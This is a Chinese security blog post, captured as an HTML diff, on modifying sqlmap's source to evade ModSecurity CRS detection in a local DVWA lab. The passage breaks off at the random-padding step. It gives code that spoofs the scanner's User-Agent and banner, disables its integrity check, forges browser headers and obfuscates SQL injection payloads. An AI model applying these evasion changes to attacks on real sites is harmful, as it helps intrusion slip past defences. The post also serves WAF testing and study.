@@ -1,0 +1,1206 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>sqlmap 魔改研究 - 从流量特征到 WAF 对抗 - blog</title>
+
+  
+    <meta name="description" content="🔧 sqlmap 魔改研究 —— 从流量特征到 WAF 对抗 本文记录了对 sqlmap 进行源码级魔改的完整过程，目标是通过修改流量特征、请求头、payload 混淆等手段，降低被 OWASP ModSecurity CRS 规则集检测到的概率。所有测试均在本地靶场（DVWA）环境下进行，仅用于学习和安全研究。 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19730842">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap 魔改研究 - 从流量特征到 WAF 对抗">
+<meta property="og:url" content="https://wr0ld.github.io/posts/5ddd3711/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="🔧 sqlmap 魔改研究 —— 从流量特征到 WAF 对抗 本文记录了对 sqlmap 进行源码级魔改的完整过程，目标是通过修改流量特征、请求头、payload 混淆等手段，降低被 OWASP ModSecurity CRS 规则集检测到的概率。所有测试均在本地靶场（DVWA）环境下进行，仅用于学习和安全研究。 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19730842">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-03-23T06:07:49.000Z">
+<meta property="article:modified_time" content="2026-03-23T08:03:24.383Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="工具魔改">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="WAF绕过">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="SQL注入,工具魔改,免杀,WAF绕过">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-23T14:07:49+08:00","dateModified":"2026-03-23T16:03:24+08:00","datePublished":"2026-03-23T14:07:49+08:00","description":"","headline":"sqlmap 魔改研究 - 从流量特征到 WAF 对抗","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/5ddd3711/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/5ddd3711/","keywords":"SQL注入, 工具魔改, 免杀, WAF绕过","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180841876.png","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper linklist"><div class="widget-header dis-select"><span class="name">文章分类</span></div><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="工具魔改" href="/categories/工具魔改/"><div class="flex"><span>工具魔改</span></div></a>
+<a class="link" title="笔记" href="/categories/笔记/"><div class="flex"><span>笔记</span></div></a>
+<a class="link" title="靶场" href="/categories/靶场/"><div class="flex"><span>靶场</span></div></a>
+<a class="link" title="靶机渗透" href="/categories/靶机渗透/"><div class="flex"><span>靶机渗透</span></div></a>
+<a class="link" title="vulnhub-DC" href="/categories/vulnhub-DC/"><div class="flex"><span>vulnhub-DC</span></div></a>
+<a class="link" title="DVWA" href="/categories/DVWA/"><div class="flex"><span>DVWA</span></div></a></div></div></widget>
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/posts/58685328/"><span class="title">CTF 伪协议</span></a><a class="item title" href="/posts/31fdd992/"><span class="title">Pikachu 靶场通关笔记</span></a><a class="item title" href="/posts/a6c6e02f/"><span class="title">常见Linux权限提升笔记</span></a><a class="item title" href="/posts/f10adb67/"><span class="title">VulnHub DC-9 靶机渗透测试笔记</span></a><a class="item title" href="/posts/16177df0/"><span class="title">VulnHub DC-8 靶机渗透测试笔记</span></a><a class="item title" href="/posts/9bfd2b6a/"><span class="title">VulnHub DC-7 靶机渗透测试笔记</span></a><a class="item title" href="/posts/7ce08dfd/"><span class="title">VulnHub DC-6 靶机渗透测试笔记</span></a><a class="item title" href="/posts/8eb76005/"><span class="title">VulnHub DC-5 靶机渗透测试笔记</span></a><a class="item title" href="/posts/69aac692/"><span class="title">VulnHub DC-4 靶机渗透测试笔记</span></a><a class="item title" href="/posts/b169bdb4/"><span class="title">VulnHub DC-3 靶机渗透测试笔记</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/wr0ld" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B7%A5%E5%85%B7%E9%AD%94%E6%94%B9/">工具魔改</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-23T06:07:49.000Z">2026-03-23</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-23T08:03:24.383Z">2026-03-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>sqlmap 魔改研究 - 从流量特征到 WAF 对抗</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="🔧-sqlmap-魔改研究-——-从流量特征到-WAF-对抗"><a href="#🔧-sqlmap-魔改研究-——-从流量特征到-WAF-对抗" class="headerlink" title="🔧 sqlmap 魔改研究 —— 从流量特征到 WAF 对抗"></a>🔧 sqlmap 魔改研究 —— 从流量特征到 WAF 对抗</h1><blockquote>
+<p>本文记录了对 sqlmap 进行源码级魔改的完整过程，目标是通过修改流量特征、请求头、payload 混淆等手段，降低被 OWASP ModSecurity CRS 规则集检测到的概率。所有测试均在本地靶场（DVWA）环境下进行，仅用于学习和安全研究。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold/p/19730842">https://www.cnblogs.com/wrold/p/19730842</a></p>
+</blockquote>
+<hr>
+<h2 id="🧠-思路"><a href="#🧠-思路" class="headerlink" title="🧠 思路"></a>🧠 思路</h2><p>很多人用 sqlmap 跑 SQL 注入，结果一跑就被 WAF 拦得死死的，403 一片。</p>
+<p>其实 WAF 拦截 sqlmap 不是魔法，靠的是<strong>规则匹配</strong>——它认识 sqlmap 的”味道”：固定的 UA、特定的请求头、可预测的 payload 结构。</p>
+<p>所以思路也很简单：<strong>把 sqlmap 改得不像 sqlmap</strong>。</p>
+<p>改哪里？大概分三层：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一层：身份特征   → UA、版本字符串、Banner</span><br><span class="line">第二层：流量特征   → 请求头、请求间隔、Host</span><br><span class="line">第三层：Payload    → 关键字大小写、空格混淆、随机 padding</span><br></pre></td></tr></table></figure>
+
+<p>下面一层一层来。</p>
+<hr>
+<h2 id="🏗️-环境搭建"><a href="#🏗️-环境搭建" class="headerlink" title="🏗️ 环境搭建"></a>🏗️ 环境搭建</h2><ul>
+<li>靶场：DVWA（phpstudy 本地部署，端口 8564）</li>
+<li>WAF：OWASP ModSecurity CRS（Docker 部署，端口 8080）</li>
+<li>工具：sqlmap 1.10，Python，Wireshark&#x2F;小蓝鲨</li>
+</ul>
+<p><strong>WAF 启动命令（检测模式，只记录不拦截）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name modsec-waf \</span><br><span class="line">  -p 8080:8080 \</span><br><span class="line">  -e BACKEND=http://172.30.240.1:8564 \</span><br><span class="line">  -e PROXY_SSL=off \</span><br><span class="line">  -e PROXY_TIMEOUT=60 \</span><br><span class="line">  -e MODSEC_RULE_ENGINE=DetectionOnly \</span><br><span class="line">  owasp/modsecurity-crs:nginx</span><br></pre></td></tr></table></figure>
+
+<p>流量走向：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap → localhost:8080 → ModSecurity → phpstudy:8564 → DVWA</span><br></pre></td></tr></table></figure>
+
+<p><strong>保存日志：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs modsec-waf &gt; waf_log.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🔍-先看原版的”指纹”"><a href="#🔍-先看原版的”指纹”" class="headerlink" title="🔍 先看原版的”指纹”"></a>🔍 先看原版的”指纹”</h2><p>用小蓝鲨抓一下原版 sqlmap 的包，过滤条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request &amp;&amp; ip.dst == 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180204114.png"></p>
+<p>一眼就能看到问题：</p>
+<ul>
+<li><code>User-Agent: sqlmap/1.9.10#pip (https://sqlmap.org)</code> —— 这不就是自报家门吗 🤦</li>
+<li><code>Accept: */*</code> —— 正常浏览器不会这么发</li>
+<li>没有 <code>Accept-Language</code>、<code>Accept-Encoding</code>、<code>Referer</code> 等正常请求头</li>
+</ul>
+<p>WAF 看到这个请求，直接触发 <code>913100</code>（扫描器 UA 检测）规则，得分 +5，超过阈值直接拦截。</p>
+<hr>
+<h2 id="📊-原版-WAF-检测基准数据"><a href="#📊-原版-WAF-检测基准数据" class="headerlink" title="📊 原版 WAF 检测基准数据"></a>📊 原版 WAF 检测基准数据</h2><p>先跑一遍原版 sqlmap，记录 WAF 触发了哪些规则，作为对比基准：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;...&quot;</span> --batch --level=3</span><br></pre></td></tr></table></figure>
+
+<p><strong>结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>规则ID</th>
+<th>触发次数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>913100</td>
+<td>100次</td>
+<td>UA 含 sqlmap 字样</td>
+</tr>
+<tr>
+<td>920350</td>
+<td>100次</td>
+<td>Host 头是纯数字 IP</td>
+</tr>
+<tr>
+<td>942100</td>
+<td>92次</td>
+<td>libinjection SQL注入检测</td>
+</tr>
+<tr>
+<td>949110</td>
+<td>100次</td>
+<td>入站总分超阈值</td>
+</tr>
+<tr>
+<td>942190</td>
+<td>28次</td>
+<td>UNION SELECT 特征</td>
+</tr>
+<tr>
+<td>942360</td>
+<td>20次</td>
+<td>SQL 注入混淆特征</td>
+</tr>
+<tr>
+<td>951230</td>
+<td>18次</td>
+<td>MySQL 错误信息泄露</td>
+</tr>
+</tbody></table>
+<p><strong>汇总：</strong></p>
+<ul>
+<li>规则触发总数：<strong>516次</strong></li>
+<li>平均每请求触发：<strong>5.2 条规则</strong></li>
+<li>平均异常分：<strong>15.2 分</strong>（WAF 阈值只有 5 分）</li>
+</ul>
+<hr>
+<h2 id="🛠️-开始魔改"><a href="#🛠️-开始魔改" class="headerlink" title="🛠️ 开始魔改"></a>🛠️ 开始魔改</h2><h3 id="第一步：消除身份特征（lib-core-settings-py）"><a href="#第一步：消除身份特征（lib-core-settings-py）" class="headerlink" title="第一步：消除身份特征（lib/core/settings.py）"></a>第一步：消除身份特征（<code>lib/core/settings.py</code>）</h3><p>这是最核心的改动，把所有 sqlmap 字样从流量里抹掉。</p>
+<p><strong>第 26 行，改版本字符串：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原来</span></span><br><span class="line">VERSION_STRING = <span class="string">&quot;sqlmap/%s#%s&quot;</span> % (...)</span><br><span class="line"><span class="comment"># 改成</span></span><br><span class="line">VERSION_STRING = <span class="string">&quot;requests/%s&quot;</span> % VERSION</span><br></pre></td></tr></table></figure>
+
+<p><strong>第 29 行，改默认 UA：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原来</span></span><br><span class="line">DEFAULT_USER_AGENT = <span class="string">&quot;%s (%s)&quot;</span> % (VERSION_STRING, SITE)</span><br><span class="line"><span class="comment"># 改成</span></span><br><span class="line">DEFAULT_USER_AGENT = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第 28 行，改站点：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SITE = <span class="string">&quot;https://example.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>改 Banner（启动时显示的那个大字）：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BANNER = <span class="string">&quot;&quot;&quot;\033[01;33m [*] Scanner Ready &#123;%s&#125; \033[0m&quot;&quot;&quot;</span> % VERSION_STRING.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<p><strong>改法律声明（去掉 sqlmap 字样）：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第 590 行</span></span><br><span class="line">LEGAL_DISCLAIMER = <span class="string">&quot;Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>改 <code>lib/utils/tui.py</code> 第 92 行：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header = <span class="string">&quot; scanner - ncurses TUI &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>改 <code>controller.py</code> 第 175 行：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header = <span class="string">&quot;scanner identified the following injection point(s) with &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过 hash 校验（<code>lib/core/common.py</code>）：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSums</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 直接返回 True，跳过完整性校验</span></span><br></pre></td></tr></table></figure>
+
+<p>改完之后启动效果：</p>
+<p>可以正常运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/sqlmap_image1.png"></p>
+<p>Banner 已经变了，不再有 sqlmap 字样 ✅</p>
+<hr>
+<h3 id="第二步：补全请求头（lib-request-basic-py）"><a href="#第二步：补全请求头（lib-request-basic-py）" class="headerlink" title="第二步：补全请求头（lib/request/basic.py）"></a>第二步：补全请求头（<code>lib/request/basic.py</code>）</h3><p>在 <code>forgeHeaders()</code> 函数里加入正常浏览器的请求头，让流量看起来更像真实用户：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== 魔改 Header 开始 =====</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Accept&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">    headers[<span class="string">&quot;Accept&quot;</span>] = <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Accept-Language&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">    headers[<span class="string">&quot;Accept-Language&quot;</span>] = <span class="string">&quot;en-US,en;q=0.9&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Accept-Encoding&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">    headers[<span class="string">&quot;Accept-Encoding&quot;</span>] = <span class="string">&quot;gzip, deflate, br&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Connection&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">    headers[<span class="string">&quot;Connection&quot;</span>] = <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">    headers[<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Referer&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers <span class="keyword">and</span> conf.url:</span><br><span class="line">    headers[<span class="string">&quot;Referer&quot;</span>] = conf.url</span><br><span class="line"><span class="comment"># ===== 魔改 Header 结束 =====</span></span><br></pre></td></tr></table></figure>
+
+<p>用小蓝鲨抓包对比，魔改后的请求头：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180540816.png"></p>
+<p>UA 已经变成 Chrome，各种请求头都补齐了，跟正常浏览器访问几乎一样 ✅</p>
+<hr>
+<h3 id="第三步：Payload-混淆（lib-core-agent-py）"><a href="#第三步：Payload-混淆（lib-core-agent-py）" class="headerlink" title="第三步：Payload 混淆（lib/core/agent.py）"></a>第三步：Payload 混淆（<code>lib/core/agent.py</code>）</h3><p>这是最有意思的部分，三个函数组合出击。</p>
+<p><strong>① 关键字随机大小写 <code>random_case_keywords</code>：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">random_case_keywords</span>(<span class="params">self, payload</span>):</span><br><span class="line">    keywords = [</span><br><span class="line">        <span class="string">&quot;SELECT&quot;</span>, <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;AND&quot;</span>, <span class="string">&quot;OR&quot;</span>, <span class="string">&quot;WHERE&quot;</span>, <span class="string">&quot;FROM&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ORDER&quot;</span>, <span class="string">&quot;BY&quot;</span>, <span class="string">&quot;GROUP&quot;</span>, <span class="string">&quot;HAVING&quot;</span>, <span class="string">&quot;LIMIT&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LIKE&quot;</span>, <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;IS&quot;</span>, <span class="string">&quot;NULL&quot;</span>, <span class="string">&quot;JOIN&quot;</span>, <span class="string">&quot;LEFT&quot;</span>, <span class="string">&quot;RIGHT&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> keywords:</span><br><span class="line">        payload = re.sub(</span><br><span class="line">            <span class="string">r&quot;\b%s\b&quot;</span> % k,</span><br><span class="line">            <span class="keyword">lambda</span> m: <span class="string">&quot;&quot;</span>.join(</span><br><span class="line">                c.upper() <span class="keyword">if</span> random.random() &gt; <span class="number">0.5</span> <span class="keyword">else</span> c.lower()</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> m.group(<span class="number">0</span>)</span><br><span class="line">            ),</span><br><span class="line">            payload,</span><br><span class="line">            flags=re.I</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>效果：<code>union select</code> → <code>UnIoN SeLeCt</code></p>
+<p><strong>② 空格随机替换 <code>obfuscate_space</code>：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">obfuscate_space</span>(<span class="params">self, payload</span>):</span><br><span class="line">    spaces = [</span><br><span class="line">        <span class="string">&quot; &quot;</span>,        <span class="comment"># 普通空格</span></span><br><span class="line">        <span class="string">&quot;/**/&quot;</span>,     <span class="comment"># 注释（注意：/*!*/ 会触发 942500，已注释掉）</span></span><br><span class="line">        <span class="comment"># &quot;/*!*/&quot;,</span></span><br><span class="line">        <span class="string">&quot;%09&quot;</span>,      <span class="comment"># tab</span></span><br><span class="line">        <span class="string">&quot;%0A&quot;</span>,      <span class="comment"># newline</span></span><br><span class="line">        <span class="string">&quot;%0D&quot;</span>,      <span class="comment"># carriage return</span></span><br><span class="line">        <span class="string">&quot;%0C&quot;</span>,      <span class="comment"># form feed</span></span><br><span class="line">        <span class="string">&quot;%0B&quot;</span>       <span class="comment"># vertical tab</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># ...对关键字后的空格进行随机替换</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>踩坑记录：</strong> 最开始列表里有 <code>/*!*/</code>（MySQL 内联注释），测试后发现它会触发 WAF 规则 <code>942500</code>，反而帮了倒忙，所以注释掉了。</p>
+</blockquote>
+<p><strong>③ 随机 padding <code>random_padding</code>：</strong></p>
